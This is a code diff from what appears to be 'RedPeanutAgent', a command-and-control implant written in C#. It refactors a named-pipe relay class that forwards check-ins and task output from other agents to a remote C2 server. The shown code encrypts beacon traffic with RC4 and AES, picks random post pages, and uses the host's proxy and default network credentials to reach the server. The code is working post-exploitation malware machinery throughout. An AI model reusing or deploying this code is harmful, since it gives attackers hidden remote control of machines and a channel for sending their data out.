@@ -15,6 +15,7 @@ using System.Net.Security;
 using System.Text;
 using System.Threading;
 using System.Web.Script.Serialization;
+using static RedPeanutAgent.Program;
 
 namespace RedPeanutAgent.C2
 {
@@ -31,13 +32,24 @@ namespace RedPeanutAgent.C2
         string cookie = "";
         string AgentidRelayed = "";
 
-        public AgentInstanceNamedPipe(NamedPipeServerStream pipe, string agentid, string serverkey, Dictionary<string, List<Utility.TaskMsg>> commands)
+        string host;
+        int port;
+        string[] pagepost;
+        string[] pageget;
+        string param;
+
+        public AgentInstanceNamedPipe(NamedPipeServerStream pipe, Worker w)
         {
             this.pipe = pipe;
-            this.agentid = agentid;
-            this.serverkey = serverkey;
-            this.sessionkey = serverkey + agentid;
-            this.wc = new Utility.CookiedWebClient();
+            this.agentid = w.agentid;
+            this.serverkey = w.serverkey;
+            this.sessionkey = w.serverkey + agentid;
+            this.wc = w.wc;
+            host = w.host;
+            port = w.port;
+            pagepost = w.pagepost;
+            pageget = w.pageget;
+            param = w.param;
 
             WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
 
@@ -52,7 +64,7 @@ namespace RedPeanutAgent.C2
 
             //this.webaeskey = aeskey;
             //this.webaesiv = aesiv;
-            this.commands = commands;
+            this.commands = w.commands;
         }
 
         public string AgentId
@@ -125,8 +137,8 @@ namespace RedPeanutAgent.C2
             string agentidrequesttemplate = new JavaScriptSerializer().Serialize(msg);
 
             //Send agentidreq to server
-            string post = String.Format("{0}={1}", Program.param, Crypto.RC4.EncryptMessage(serverkey, agentidrequesttemplate));
-            string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pagepost[new Random().Next(Program.pagepost.Length)], post);
+            string post = String.Format("{0}={1}", param, Crypto.RC4.EncryptMessage(serverkey, agentidrequesttemplate));
+            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)], post);
 
             string resp = wc.UploadString(rpaddress, post);
 
@@ -172,11 +184,11 @@ namespace RedPeanutAgent.C2
 
                 output = ReadOutput();
 
-                wc.Add(new Cookie("sessionid", cookie, "/", Program.host));
+                wc.Add(new Cookie("sessionid", cookie, "/", host));
 
                 // Send output to server
-                string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pagepost[new Random().Next(Program.pagepost.Length)]);
-                Utility.SendOutputHttp(task.Instanceid, output.ToString(), wc, webaeskey, webaesiv, rpaddress, Program.param, AgentidRelayed, agentid);
+                string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
+                Utility.SendOutputHttp(task.Instanceid, output.ToString(), wc, webaeskey, webaesiv, rpaddress, param, AgentidRelayed, agentid);
             }
             catch (IOException e)
             {
@@ -225,18 +237,18 @@ namespace RedPeanutAgent.C2
                 msg = new JavaScriptSerializer().Deserialize<Utility.CheckInMsg>(line);
 
                 //Send checkin message to server
-                string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pagepost[new Random().Next(Program.pagepost.Length)]);
+                string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
 
                 string checkinmsg = new JavaScriptSerializer().Serialize(msg);
                 var checkinmsgenc = Crypto.Aes.EncryptAesMessage(checkinmsg, webaeskey, webaesiv);
 
-                string post = String.Format("{0}={1}", Program.param, Convert.ToBase64String(checkinmsgenc));
+                string post = String.Format("{0}={1}", param, Convert.ToBase64String(checkinmsgenc));
 
                 wc.UseDefaultCredentials = true;
                 wc.Proxy = WebRequest.DefaultWebProxy;
                 wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
 
-                wc.Add(new Cookie("sessionid", cookie, "/", Program.host));
+                wc.Add(new Cookie("sessionid", cookie, "/", host));
 
                 string resp = wc.UploadString(rpaddress, post);
                 string respjson = Crypto.Aes.DecryptAesMessage(Convert.FromBase64String(resp), webaeskey, webaesiv);
